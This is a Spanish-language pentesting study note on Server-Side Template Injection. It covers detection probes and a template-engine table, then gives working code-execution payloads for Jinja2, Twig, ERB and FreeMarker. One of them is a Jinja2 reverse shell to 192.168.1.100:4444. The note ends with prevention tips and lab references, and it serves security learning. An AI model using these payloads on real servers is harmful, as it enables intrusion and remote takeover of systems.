
---
Tags: #web #template #ssti #rce 

---
# Definición

> [[SSTI - Server-Side Template Injection]] es una vulnerabilidad que ocurre cuando una aplicación web evalúa entradas del usuario dentro de un motor de plantillas del lado del servidor, permitiendo ejecución de código arbitrario (RCE en algunos casos).

[!info] IMPORTANTE - Utilizar herramientas como **whatweb** (Consola) o **Wappalyzer** (Extensión)

---

## 🔍 ¿Cómo detectar SSTI?

1. **Introducir payloads simples** y ver si se renderizan:
    
    - `{{7*7}}`
        
    - `#{7*7}`
        
    - `<%= 7*7 %>`
        
2. **Resultado esperado**:
    
    - Si ves `49`, el input es evaluado (posible SSTI).
        
    - Si ves el payload sin cambios, no hay inyección.
        
3. **Fuzzing útil**: Usa `wfuzz`, `ffuf`, Burp Suite o intruder con listas de payloads de plantillas.
    

---

## 🧩 Motores de Plantillas Comunes

|Lenguaje|Motor de plantilla|Sintaxis|
|---|---|---|
|Python|Jinja2, Mako|`{{ 7*7 }}`|
|PHP|Smarty, Twig|`{{ 7*7 }}`|
|Ruby|ERB|`<%= 7*7 %>`|
|Java|FreeMarker, JSP|`${7*7}`|
|JavaScript|EJS, Handlebars|`<%= 7*7 %>`|

---

## 🛠️ Ejemplo de detección
```html
<input name="username" value="{{7*7}}">
```

Si se interpreta y devuelve `49`, puede que estés frente a SSTI.

---

## 💣 Técnicas de Explotación

### 🐍 Jinja2 (Python)

**Escalada a RCE:**
```jinja
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```


**Reverse Shell:**
```jinja
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"').read() }}
```

---

### 🌲 Twig (PHP)

**Ejecución de comandos en versiones inseguras:**
```twig
{{ system('id') }}
```

**Desde filtros o funciones:**
```twig
{{ ['id']|map('system')|join }}
```

> Twig moderno filtra funciones peligrosas por defecto.

---

### 💎 ERB (Ruby)
```ruby
<%= `id` %> <%= system("ls") %>
```

---

### 📜 FreeMarker (Java)
```jsp
${"freemarker.template.utility.Execute"?new()("id")}
```

---

## 🧪 Payloads Comunes (fuzzing)

```txt
{{7*7}} {{1337*1337}} <%= 7*7 %> #{7*7} ${7*7} *{7*7} <% 7*7 %>
```

---

## 🔄 Funciones peligrosas comunes

|Función|Uso|
|---|---|
|`os.system`|Ejecutar comandos en shell|
|`popen()`|Captura salida de comandos|
|`__import__()`|Importar módulos arbitrarios|
|`eval()`|Evaluar código dinámico|

---

## 🧰 Herramientas útiles

|Herramienta|Descripción|
|---|---|
|Burp Suite Intruder|Fuzzing automático|
|wfuzz / ffuf|Fuzzers de parámetros|
|tplmap|Framework automatizado para SSTI|
|PayloadsAllTheThings|Repositorio con payloads de SSTI|

---

## 🧷 Prevención

- No renderizar plantillas con datos sin filtrar.
    
- No utilizar funciones como `eval()`, `exec()`, `popen()` en plantillas.
    
- Usar motores de plantillas seguros que escapen variables automáticamente.
    
- Validar y sanear la entrada del usuario.

---
# Referencias

- Más información: [Enlace](https://infayer.com/archivos/803)
- Página de Portswigger con laboratorios: [Enlace](https://portswigger.net/web-security/server-side-template-injection)
- Payloads y técnicas de explotación: [Enlace](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)